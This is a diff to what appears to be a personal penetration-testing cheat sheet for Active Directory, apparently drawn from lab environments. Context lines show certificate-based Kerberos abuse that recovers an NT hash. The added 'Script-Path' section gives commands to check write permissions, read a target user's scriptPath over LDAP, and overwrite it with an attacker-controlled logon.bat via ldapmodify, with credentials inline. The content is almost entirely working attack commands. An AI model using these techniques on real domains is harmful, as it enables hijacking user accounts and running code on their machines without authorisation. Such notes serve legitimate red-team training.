@@ -1348,6 +1348,30 @@ python3 gettgtpkinit.py -cert-pfx management.pfx -pfx-pass p9bX29Eozi8fT3CEpSvL 
 # key is in gettgtpkinit.py output
 KRB5CCNAME=MANAGEMENT_SVC.ccache python3 getnthash.py -key c5b9e16f65d7f78cf15c8b185bfb75b2d1df367d1f3091392d336a7130669bef certified.htb/MANAGEMENT_SVC 
 ```
+#### Script-Path
+Enum
+```bash
+# permission
+python examples/dacledit.py -principal own_user -target 'target' -dc-ip 10.129.229.224  inlanefreight.local/own_user:'pass'
+smbcacls //10.129.229.224/NETLOGON /targetScripts -U own_user%'pass'
+
+# scriptPath
+ldapsearch -LLL -H ldap://10.129.229.224 -x -D 'own_user@inlanefreight.local' -w 'SecurePassJul!08' -b "DC=inlanefreight,DC=local" "(sAMAccountName=target)" scriptPath
+
+# logon script and smbclient put
+vim logon.bat
+```
+Modify
+```bash
+# logonScript.ldif
+dn: CN=target,CN=Users,DC=inlanefreight,DC=local
+changetype: modify
+replace: scriptPath
+scriptPath: targetScripts\logon.bat
+```
+```bash
+ldapmodify -H ldap://10.129.229.224 -x -D 'own_user@inlanefreight.local' -w 'pass' -f logonScript.ldif
+```
 
 ### LOLBIN
 ```powershell
